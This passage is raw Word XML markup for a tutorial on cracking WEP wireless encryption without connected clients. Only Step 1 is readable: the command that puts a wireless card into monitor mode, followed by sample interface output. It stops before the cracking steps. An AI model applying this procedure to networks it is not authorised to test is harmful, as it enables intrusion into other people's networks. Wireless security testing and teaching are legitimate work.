    <w:p w14:paraId="04C7B606" w14:textId="5117B63D" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1"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 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1B1147" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52729BA5" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D07972" w14:textId="430E091B" w:rsidR="006D3FA1" w:rsidRDefault="006D3FA1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C80270E" w14:textId="77777777" w:rsidR="006D3FA1" w:rsidRPr="006D3FA1" w:rsidRDefault="006D3FA1" w:rsidP="006D3FA1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DCE49F8" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t>Tutorial: How to crack WEP with no wireless clients</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF89CA3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="459E087C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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Step 1 - Start the wireless interface in monitor mode on AP channel</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AB84CD8"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Enter the following command to start the wireless card on channel 9 in monitor mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B68E577" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3237EEC2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A56B4" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airmon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-zc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> start wlan0 9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CF4AF1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="797AB772"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DC7D95" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Interface       Chipset         Driver</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CCAAFFE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CE8EA6" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2D433505" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            Atheros         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>madwifi-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> VAP (parent: wlan0) (monitor mode enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0655DBEF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="26E30E82"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To confirm the interface is properly setup, enter “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>iwconfig</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB04AEB"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59371454" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>lo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3113B734" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>eth0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C6813D1" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     no wireless extensions.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FCD0F2C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      IEEE 802.11g  ESSID:""  Nickname:""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18CBC116" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Mode</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:Monitor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Frequency:2.452 GHz  Access Point: 00:09:5B:EC:EE:F2   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBB2203" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Bit Rate:0 kb/s   Tx-Power</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>:15</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Sensitivity=0/3  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3514AFB2" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Retry:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   RTS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   Fragment </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>thr:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="75A51B00" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Encryption </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>key:off</w:t>
      </w:r>
